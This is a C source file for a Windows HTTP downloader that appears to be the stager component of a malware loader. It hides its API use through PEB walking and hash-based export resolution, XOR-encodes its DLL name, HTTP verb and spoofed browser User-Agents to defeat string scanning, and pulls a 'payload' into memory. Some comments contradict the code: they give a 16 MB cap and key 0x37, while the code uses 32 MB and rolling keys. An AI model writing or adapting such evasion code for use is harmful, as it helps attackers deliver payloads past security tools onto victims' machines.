/*
 * http.c — WinHTTP downloader with evasion improvements
 *
 * Hardening notes:
 *   - No WinHttp* function is referenced by name as an import. Every WinHttp*
 *     entry point is resolved at runtime by DJB2 hash via
 *     peb_find_export() after loading winhttp.dll with a PEB-resolved
 *     LoadLibraryA. The "winhttp.dll" string is XOR-encoded (key 0x37) and
 *     decoded on the stack, so it never appears in .rdata.
 *   - The three User-Agent strings (Chrome 120 / Firefox 121 / Edge 120) are
 *     XOR-encoded UTF-16LE byte arrays (key 0x37) and decoded into stack
 *     wchar_t buffers via xor_dec_w(), so `strings -el` finds nothing.
 *   - MultiByteToWideChar and GetTickCount are resolved from kernel32 by hash
 *     via peb_resolve_kernel32() — no plaintext API references.
 *   - 16 MB download cap and chunked read are preserved.
 *   - Debug output is still guarded by #if DEBUG (see obfuscation.h).
 *
 */

#include "http.h"
#include "obfuscation.h"
#include "peb.h"

/* <winhttp.h> is included ONLY for the constant macros
 * (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_FLAG_SECURE, INTERNET_SCHEME_HTTPS,
 *  WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_NO_*). We never name a WinHttp*
 *  function directly — every call goes through a function pointer resolved
 *  by hash — so the import library is not needed for the functions. */
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>

/* Maximum payload size — 16 MB */
#define MAX_PAYLOAD_SIZE (32 * 1024 * 1024)

/* ============================================================= *
 *  DJB2 hashes (peb.c algorithm)
 * ============================================================= */
/* winhttp.dll exports */
#define H_WinHttpOpen              0x5E4F39E5u
#define H_WinHttpConnect           0x7242C17Du
#define H_WinHttpOpenRequest        0xEAB7B9CEu
#define H_WinHttpSendRequest        0xB183FAA6u
#define H_WinHttpReceiveResponse    0x146C4925u
#define H_WinHttpReadData           0x7195E4E9u
#define H_WinHttpCloseHandle        0x36220CD5u
#define H_WinHttpCrackUrl           0x8272988Au
/* kernel32 exports — match peb.h */
#define H_GetTickCount             0x41AD16B9u
#define H_MultiByteToWideChar       0xE2FDDA8Eu
#define H_LoadLibraryA              0x5FBFF0FBu

/* ============================================================= *
 *  WinHttp* function-pointer typedefs (match real <winhttp.h> prototypes)
 * ============================================================= */
typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR,
                                                 LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
typedef WINBOOL   (WINAPI *pfnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD,
                                                  LPVOID, DWORD, DWORD, DWORD_PTR);
typedef WINBOOL   (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef WINBOOL   (WINAPI *pfnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef WINBOOL   (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);
typedef WINBOOL   (WINAPI *pfnWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);

/* kernel32 function-pointer typedefs */
typedef DWORD     (WINAPI *pfnGetTickCount)(VOID);
typedef int       (WINAPI *pfnMultiByteToWideChar)(UINT, DWORD, LPCCH, int,
                                                   LPWSTR, int);
typedef HMODULE   (WINAPI *pfnLoadLibraryA)(LPCSTR);

/* ============================================================= *
 *  XOR-encoded data (multi-byte rolling-key per string)
 * ============================================================= */

/* V1: multi-byte rolling-key XOR */
static const uint8_t _enc_key_winhttp[6] = { 0xec, 0xaf, 0xb8, 0x55, 0xdc, 0xa5 };
static const uint8_t _enc_winhttp_dll[] = {
    0x9b, 0xc6, 0xd6, 0x3d, 0xa8, 0xd1, 0x9c, 0x81, 0xdc, 0x39, 0xb0
};
#define WINHTTP_DLL_NLEN 11

/* UA1: Chrome 120 (111 chars) — multi-byte rolling-key, UTF-16LE */
static const uint8_t _enc_key_ua1[8] = { 0x8e, 0x5b, 0x8c, 0x4c, 0x7e, 0xd9, 0x6b, 0x76 };
static const uint8_t _enc_ua1[] = {
    0xc3, 0x5b, 0xe3, 0x4c, 0x04, 0xd9, 0x02, 0x76, 0xe2, 0x5b, 0xe0, 0x4c, 0x1f, 0xd9, 0x44, 0x76,
    0xbb, 0x5b, 0xa2, 0x4c, 0x4e, 0xd9, 0x4b, 0x76, 0xa6, 0x5b, 0xdb, 0x4c, 0x17, 0xd9, 0x05, 0x76,
    0xea, 0x5b, 0xe3, 0x4c, 0x09, 0xd9, 0x18, 0x76, 0xae, 0x5b, 0xc2, 0x4c, 0x2a, 0xd9, 0x4b, 0x76,
    0xbf, 0x5b, 0xbc, 0x4c, 0x50, 0xd9, 0x5b, 0x76, 0xb5, 0x5b, 0xac, 0x4c, 0x29, 0xd9, 0x02, 0x76,
    0xe0, 0x5b, 0xba, 0x4c, 0x4a, 0xd9, 0x50, 0x76, 0xae, 0x5b, 0xf4, 0x4c, 0x48, 0xd9, 0x5f, 0x76,
    0xa7, 0x5b, 0xac, 0x4c, 0x3f, 0xd9, 0x1b, 0x76, 0xfe, 0x5b, 0xe0, 0x4c, 0x1b, 0xd9, 0x3c, 0x76,
    0xeb, 0x5b, 0xee, 0x4c, 0x35, 0xd9, 0x02, 0x76, 0xfa, 0x5b, 0xa3, 0x4c, 0x4b, 0xd9, 0x58, 0x76,
    0xb9, 0x5b, 0xa2, 0x4c, 0x4d, 0xd9, 0x5d, 0x76, 0xae, 0x5b, 0xa4, 0x4c, 0x35, 0xd9, 0x23, 0x76,
    0xda, 0x5b, 0xc1, 0x4c, 0x32, 0xd9, 0x47, 0x76, 0xae, 0x5b, 0xe0, 0x4c, 0x17, 0xd9, 0x00, 0x76,
    0xeb, 0x5b, 0xac, 0x4c, 0x39, 0xd9, 0x0e, 0x76, 0xed, 0x5b, 0xe7, 0x4c, 0x11, 0xd9, 0x42, 0x76,
    0xae, 0x5b, 0xcf, 0x4c, 0x16, 0xd9, 0x19, 0x76, 0xe1, 0x5b, 0xe1, 0x4c, 0x1b, 0xd9, 0x44, 0x76,
    0xbf, 0x5b, 0xbe, 0x4c, 0x4e, 0xd9, 0x45, 0x76, 0xbe, 0x5b, 0xa2, 0x4c, 0x4e, 0xd9, 0x45, 0x76,
    0xbe, 0x5b, 0xac, 0x4c, 0x2d, 0xd9, 0x0a, 0x76, 0xe8, 0x5b, 0xed, 0x4c, 0x0c, 0xd9, 0x02, 0x76,
    0xa1, 0x5b, 0xb9, 0x4c, 0x4d, 0xd9, 0x5c, 0x76, 0xa0, 0x5b, 0xbf, 0x4c, 0x48, 0xd9
};
#define UA1_LEN 111

/* UA2: Firefox 121 (80 chars) — multi-byte rolling-key, UTF-16LE */
static const uint8_t _enc_key_ua2[8] = { 0x59, 0x8b, 0x29, 0x69, 0x52, 0xb6, 0x9c, 0xee };
static const uint8_t _enc_ua2[] = {
    0x14, 0x8b, 0x46, 0x69, 0x28, 0xb6, 0xf5, 0xee, 0x35, 0x8b, 0x45, 0x69, 0x33, 0xb6, 0xb3, 0xee,
    0x6c, 0x8b, 0x07, 0x69, 0x62, 0xb6, 0xbc, 0xee, 0x71, 0x8b, 0x7e, 0x69, 0x3b, 0xb6, 0xf2, 0xee,
    0x3d, 0x8b, 0x46, 0x69, 0x25, 0xb6, 0xef, 0xee, 0x79, 0x8b, 0x67, 0x69, 0x06, 0xb6, 0xbc, 0xee,
    0x68, 0x8b, 0x19, 0x69, 0x7c, 0xb6, 0xac, 0xee, 0x62, 0x8b, 0x09, 0x69, 0x05, 0xb6, 0xf5, 0xee,
    0x37, 0x8b, 0x1f, 0x69, 0x66, 0xb6, 0xa7, 0xee, 0x79, 0x8b, 0x51, 0x69, 0x64, 0xb6, 0xa8, 0xee,
    0x62, 0x8b, 0x09, 0x69, 0x20, 0xb6, 0xea, 0xee, 0x63, 0x8b, 0x18, 0x69, 0x60, 0xb6, 0xad, 0xee,
    0x77, 0x8b, 0x19, 0x69, 0x7b, 0xb6, 0xbc, 0xee, 0x1e, 0x8b, 0x4c, 0x69, 0x31, 0xb6, 0xf7, 0xee,
    0x36, 0x8b, 0x06, 0x69, 0x60, 0xb6, 0xac, 0xee, 0x68, 0x8b, 0x19, 0x69, 0x62, 0xb6, 0xad, 0xee,
    0x69, 0x8b, 0x18, 0x69, 0x72, 0xb6, 0xda, 0xee, 0x30, 0x8b, 0x5b, 0x69, 0x37, 0xb6, 0xfa, 0xee,
    0x36, 0x8b, 0x51, 0x69, 0x7d, 0xb6, 0xad, 0xee, 0x6b, 0x8b, 0x18, 0x69, 0x7c, 0xb6, 0xac, 0xee
};
#define UA2_LEN 80

/* UA3: Edge 120 (125 chars) — multi-byte rolling-key, UTF-16LE */
static const uint8_t _enc_key_ua3[8] = { 0xc6, 0x73, 0xef, 0xd8, 0xae, 0x97, 0xea, 0x30 };
static const uint8_t _enc_ua3[] = {
    0x8b, 0x73, 0x80, 0xd8, 0xd4, 0x97, 0x83, 0x30, 0xaa, 0x73, 0x83, 0xd8, 0xcf, 0x97, 0xc5, 0x30,
    0xf3, 0x73, 0xc1, 0xd8, 0x9e, 0x97, 0xca, 0x30, 0xee, 0x73, 0xb8, 0xd8, 0xc7, 0x97, 0x84, 0x30,
    0xa2, 0x73, 0x80, 0xd8, 0xd9, 0x97, 0x99, 0x30, 0xe6, 0x73, 0xa1, 0xd8, 0xfa, 0x97, 0xca, 0x30,
    0xf7, 0x73, 0xdf, 0xd8, 0x80, 0x97, 0xda, 0x30, 0xfd, 0x73, 0xcf, 0xd8, 0xf9, 0x97, 0x83, 0x30,
    0xa8, 0x73, 0xd9, 0xd8, 0x9a, 0x97, 0xd1, 0x30, 0xe6, 0x73, 0x97, 0xd8, 0x98, 0x97, 0xde, 0x30,
    0xef, 0x73, 0xcf, 0xd8, 0xef, 0x97, 0x9a, 0x30, 0xb6, 0x73, 0x83, 0xd8, 0xcb, 0x97, 0xbd, 0x30,
    0xa3, 0x73, 0x8d, 0xd8, 0xe5, 0x97, 0x83, 0x30, 0xb2, 0x73, 0xc0, 0xd8, 0x9b, 0x97, 0xd9, 0x30,
    0xf1, 0x73, 0xc1, 0xd8, 0x9d, 0x97, 0xdc, 0x30, 0xe6, 0x73, 0xc7, 0xd8, 0xe5, 0x97, 0xa2, 0x30,
    0x92, 0x73, 0xa2, 0xd8, 0xe2, 0x97, 0xc6, 0x30, 0xe6, 0x73, 0x83, 0xd8, 0xc7, 0x97, 0x81, 0x30,
    0xa3, 0x73, 0xcf, 0xd8, 0xe9, 0x97, 0x8f, 0x30, 0xa5, 0x73, 0x84, 0xd8, 0xc1, 0x97, 0xc3, 0x30,
    0xe6, 0x73, 0xac, 0xd8, 0xc6, 0x97, 0x98, 0x30, 0xa9, 0x73, 0x82, 0xd8, 0xcb, 0x97, 0xc5, 0x30,
    0xf7, 0x73, 0xdd, 0xd8, 0x9e, 0x97, 0xc4, 0x30, 0xf6, 0x73, 0xc1, 0xd8, 0x9e, 0x97, 0xc4, 0x30,
    0xf6, 0x73, 0xcf, 0xd8, 0xfd, 0x97, 0x8b, 0x30, 0xa0, 0x73, 0x8e, 0xd8, 0xdc, 0x97, 0x83, 0x30,
    0xe9, 0x73, 0xda, 0xd8, 0x9d, 0x97, 0xdd, 0x30, 0xe8, 0x73, 0xdc, 0xd8, 0x98, 0x97, 0xca, 0x30,
    0x83, 0x73, 0x8b, 0xd8, 0xc9, 0x97, 0xc5, 0x30, 0xf7, 0x73, 0xdd, 0xd8, 0x9e, 0x97, 0xc4, 0x30,
    0xf6, 0x73, 0xc1, 0xd8, 0x9e, 0x97, 0xc4, 0x30, 0xf6, 0x73
};
#define UA3_LEN 125

/* V2: L"GET" encoded (was plaintext) */
static const uint8_t _enc_key_get[4] = { 0xed, 0xaa, 0xe4, 0x1d };
static const uint8_t _enc_get[] = {
    0xaa, 0xaa, 0xa1, 0x1d, 0xb9, 0xaa
};
#define GET_LEN 3

/* ============================================================= *
 *  Dynamic API resolution
 * ============================================================= */

/* One-time resolution of every API we need. Returns 1 on success, 0 if any
 * resolution failed (caller treats as fatal). All pointers land in *ap. */
typedef struct {
    /* winhttp.dll base + resolved exports */
    HMODULE                  wh_base;
    pfnWinHttpOpen           WinHttpOpen;
    pfnWinHttpConnect        WinHttpConnect;
    pfnWinHttpOpenRequest    WinHttpOpenRequest;
    pfnWinHttpSendRequest    WinHttpSendRequest;
    pfnWinHttpReceiveResponse WinHttpReceiveResponse;
    pfnWinHttpReadData       WinHttpReadData;
    pfnWinHttpCloseHandle    WinHttpCloseHandle;
    pfnWinHttpCrackUrl       WinHttpCrackUrl;
    /* kernel32 exports (resolved by hash, no static imports) */
    pfnGetTickCount          GetTickCount;
    pfnMultiByteToWideChar    MultiByteToWideChar;
    pfnLoadLibraryA           LoadLibraryA;
} api_table;

static int resolve_apis(api_table *ap)
{
    /* ---- kernel32 exports by hash (no plaintext API refs) ---- */
    ap->GetTickCount        = (pfnGetTickCount)        peb_resolve_kernel32(H_GetTickCount);
    ap->MultiByteToWideChar = (pfnMultiByteToWideChar) peb_resolve_kernel32(H_MultiByteToWideChar);
    ap->LoadLibraryA        = (pfnLoadLibraryA)        peb_resolve_kernel32(H_LoadLibraryA);
    if (!ap->GetTickCount || !ap->MultiByteToWideChar || !ap->LoadLibraryA)
        return 0;

    /* ---- load winhttp.dll (XOR-encoded name, decoded on the stack) ---- */
    char dllbuf[WINHTTP_DLL_NLEN + 1];
    char *dll = xor_dec_mb(dllbuf, _enc_winhttp_dll, WINHTTP_DLL_NLEN, _enc_key_winhttp, 6);
    ap->wh_base = ap->LoadLibraryA(dll);
    secure_zero(dllbuf, sizeof(dllbuf));
    if (!ap->wh_base)
        return 0;

    /* ---- resolve every WinHttp* export by DJB2 hash ---- */
    ap->WinHttpOpen           = (pfnWinHttpOpen)           peb_find_export(ap->wh_base, H_WinHttpOpen);
    ap->WinHttpConnect        = (pfnWinHttpConnect)        peb_find_export(ap->wh_base, H_WinHttpConnect);
    ap->WinHttpOpenRequest    = (pfnWinHttpOpenRequest)    peb_find_export(ap->wh_base, H_WinHttpOpenRequest);
    ap->WinHttpSendRequest    = (pfnWinHttpSendRequest)    peb_find_export(ap->wh_base, H_WinHttpSendRequest);
    ap->WinHttpReceiveResponse = (pfnWinHttpReceiveResponse) peb_find_export(ap->wh_base, H_WinHttpReceiveResponse);
    ap->WinHttpReadData       = (pfnWinHttpReadData)       peb_find_export(ap->wh_base, H_WinHttpReadData);
    ap->WinHttpCloseHandle    = (pfnWinHttpCloseHandle)    peb_find_export(ap->wh_base, H_WinHttpCloseHandle);
    ap->WinHttpCrackUrl       = (pfnWinHttpCrackUrl)       peb_find_export(ap->wh_base, H_WinHttpCrackUrl);

    if (!ap->WinHttpOpen || !ap->WinHttpConnect || !ap->WinHttpOpenRequest ||
        !ap->WinHttpSendRequest || !ap->WinHttpReceiveResponse ||
        !ap->WinHttpReadData || !ap->WinHttpCloseHandle || !ap->WinHttpCrackUrl)
        return 0;

    return 1;
}

/* to_wide() now uses the resolved MultiByteToWideChar (no static import). */
static wchar_t *to_wide(const api_table *ap, const char *str)
{
    int len = ap->MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0)
        return NULL;
    wchar_t *wide = (wchar_t *)malloc((size_t)len * sizeof(wchar_t));
    if (!wide)
        return NULL;
    ap->MultiByteToWideChar(CP_UTF8, 0, str, -1, wide, len);
    return wide;
}

/* Build a realistic User-Agent at runtime into buf.
 * Decodes one of three XOR-encoded UTF-16LE UA arrays and picks the index
 * via the PEB-resolved GetTickCount (mod 3). No plaintext UA in .rdata. */
static void build_user_agent(const api_table *ap, wchar_t *buf, int bufsize)
{
    int idx = (int)(ap->GetTickCount() % 3u);
    wchar_t tmp[UA3_LEN + 1];   /* big enough for the longest UA */

    switch (idx) {
    case 0:
        xor_dec_w_mb(tmp, _enc_ua1, UA1_LEN, _enc_key_ua1, 8);
        break;
    case 1:
        xor_dec_w_mb(tmp, _enc_ua2, UA2_LEN, _enc_key_ua2, 8);
        break;
    default:
        xor_dec_w_mb(tmp, _enc_ua3, UA3_LEN, _enc_key_ua3, 8);
        break;
    }

    /* Copy decoded UA into the caller's buffer (bounded). */
    int i = 0;
    for (; i < bufsize - 1 && tmp[i]; i++)
        buf[i] = tmp[i];
    buf[i] = L'\0';

    /* Wipe the decoded UA from the scratch stack buffer. */
    secure_zero(tmp, sizeof(tmp));
}

BOOL http_download(const char *url, uint8_t **out_data, size_t *out_len)
{
    BOOL result = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    URL_COMPONENTSW uc;
    wchar_t hostName[256] = {0};
    wchar_t urlPath[1024] = {0};

    *out_data = NULL;
    *out_len  = 0;

    /* Resolve every API we need up front. Fail closed. */
    DBG_PRINTF("[http] entering http_download, url='%s'\n", url);
    api_table ap;
    ZeroMemory(&ap, sizeof(ap));
    if (!resolve_apis(&ap)) {
        DBG_PRINTF("[http] resolve_apis FAILED (wh_base=%p open=%p conn=%p oreq=%p send=%p recv=%p read=%p close=%p crack=%p gt=%p mb2w=%p ll=%p)\n",
                   ap.wh_base, ap.WinHttpOpen, ap.WinHttpConnect, ap.WinHttpOpenRequest,
                   ap.WinHttpSendRequest, ap.WinHttpReceiveResponse, ap.WinHttpReadData,
                   ap.WinHttpCloseHandle, ap.WinHttpCrackUrl,
                   ap.GetTickCount, ap.MultiByteToWideChar, ap.LoadLibraryA);
        return FALSE;
    }
    DBG_PRINTF("[http] resolve_apis OK\n");

    wchar_t *wurl = to_wide(&ap, url);
    if (!wurl) {
        DBG_PRINTF("[http] to_wide failed\n");
        return FALSE;
    }

    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize    = sizeof(uc);
    uc.lpszHostName    = hostName;
    uc.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
    uc.lpszUrlPath     = urlPath;
    uc.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

    if (!ap.WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        DBG_PRINTF("[http] WinHttpCrackUrl failed: %lu\n", GetLastError());
        free(wurl);
        return FALSE;
    }
    DBG_PRINTF("[http] cracked host=%ls port=%u path=%ls scheme=%d\n",
               hostName, (unsigned)uc.nPort, urlPath, (int)uc.nScheme);
    free(wurl);

    /* Build realistic User-Agent at runtime */
    wchar_t ua[UA3_LEN + 1];
    build_user_agent(&ap, ua, (int)(sizeof(ua) / sizeof(wchar_t)));

    hSession = ap.WinHttpOpen(ua,
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME,
                              WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        DBG_PRINTF("[http] WinHttpOpen failed: %lu\n", GetLastError());
        return FALSE;
    }

    hConnect = ap.WinHttpConnect(hSession, hostName, uc.nPort, 0);
    if (!hConnect) {
        DBG_PRINTF("[http] WinHttpConnect failed: %lu\n", GetLastError());
        goto cleanup;
    }

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    wchar_t get_buf[GET_LEN + 1];
    wchar_t *get_str = xor_dec_w_mb(get_buf, _enc_get, GET_LEN, _enc_key_get, 4);
    hRequest = ap.WinHttpOpenRequest(hConnect, get_str, urlPath,
                                     NULL, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        DBG_PRINTF("[http] WinHttpOpenRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (!ap.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        DBG_PRINTF("[http] WinHttpSendRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (!ap.WinHttpReceiveResponse(hRequest, NULL)) {
        DBG_PRINTF("[http] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Read response body in chunks with size limit */
    {
        uint8_t *buf = NULL;
        size_t total = 0;
        DWORD bytes_read = 0;
        uint8_t chunk[4096];

        for (;;) {
            if (!ap.WinHttpReadData(hRequest, chunk, sizeof(chunk), &bytes_read))
                goto read_fail;
            if (bytes_read == 0)
                break;

            /* Size limit check */
            if (total + bytes_read > MAX_PAYLOAD_SIZE) {
                DBG_PRINTF("[-] Payload exceeds max size %d\n", MAX_PAYLOAD_SIZE);
                goto read_fail;
            }

            uint8_t *tmp = (uint8_t *)realloc(buf, total + bytes_read);
            if (!tmp)
                goto read_fail;
            buf = tmp;
            memcpy(buf + total, chunk, bytes_read);
            total += bytes_read;
        }

        *out_data = buf;
        *out_len  = total;
        result = TRUE;
        goto cleanup;

    read_fail:
        free(buf);
    }

cleanup:
    if (hRequest) ap.WinHttpCloseHandle(hRequest);
    if (hConnect) ap.WinHttpCloseHandle(hConnect);
    if (hSession) ap.WinHttpCloseHandle(hSession);
    return result;
}
